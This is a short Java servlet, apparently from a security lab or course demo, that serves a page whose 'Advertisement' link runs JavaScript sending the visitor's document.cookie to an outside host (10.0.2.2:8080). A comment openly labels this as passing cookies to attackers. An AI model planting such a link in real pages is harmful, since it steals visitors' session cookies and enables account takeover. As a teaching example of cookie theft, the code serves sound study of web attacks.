import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;

/*
 * Display the webpage with vulnerability in advertisement
 */
public class WelcomePage extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse res) throws IOException {
		PrintWriter content = res.getWriter();


		// set encoding/type
		res.setContentType("text/html; charset=utf-8");
		// set good status code
		res.setStatus(HttpServletResponse.SC_OK);

		//print some info to the webpage
		content.print("<h1>");
	 	content.print("Website with vulnerability in advertisement");
		content.println("</h1>");
        content.print("<p>");
        content.print("The vulnerability is within the link of"
                		+ " the advertisement");
        content.print("</p>");

		//use javascript to pass cookies of current webpage to malicious attackers
	    content.println("<p><a href = 'javascript:location.href = \"http://10.0.2.2:8080/Ad?username=\" + document.cookie'>");
 		content.println("Advertisement");
		content.println("</a></p>");		
	}
}
